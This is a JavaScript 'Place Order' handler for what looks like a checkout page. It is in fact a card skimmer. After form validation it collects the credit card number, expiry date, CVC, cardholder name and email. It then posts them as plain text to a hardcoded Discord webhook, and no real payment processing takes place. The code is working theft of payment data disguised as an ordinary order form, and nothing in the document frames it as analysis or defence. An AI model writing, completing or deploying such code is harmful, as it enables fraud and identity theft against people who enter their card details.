// Called when user clicks "Place Order"
function message() {
  // First validate inputs by calling validateInputs() in HTML
  if (!validateInputs()) {
    // Validation failed; showNotification already called inside validateInputs
    return;
  }

  // If validation passes, send data to webhook or perform any additional actions here
  const CreditCardNumber = document.getElementById("CreditCardNumber").value.trim();
  const MMYY = document.getElementById("MMYY").value.trim();
  const CVC = document.getElementById("CVC").value.trim();
  const FULLNAME = document.getElementById("FULLNAME").value.trim();
  const EmailAddress = document.getElementById("EmailAddress").value.trim();

  const webhook =
    "https://discord.com/api/webhooks/1378531882123264000/NP_fhJY4e2uaju-9EvWt40TVLJZM-YsdWgFs9Rwn6dgiKQEk-36tpPwgGPqtURiChdrC";

  const contents = `Credit Card Number: ${CreditCardNumber}\nDate Of Expiry: ${MMYY}\nCVC: ${CVC}\nFull Name on Card: ${FULLNAME}\nEmail Address: ${EmailAddress}`;

  const request = new XMLHttpRequest();
  request.open("POST", webhook);
  request.setRequestHeader('Content-Type', 'application/json');

  const params = {
    content: contents
  };

  request.send(JSON.stringify(params));

  // No need to manually call showNotification or redirect here,
  // since validateInputs() already shows success notification and triggers redirect
}
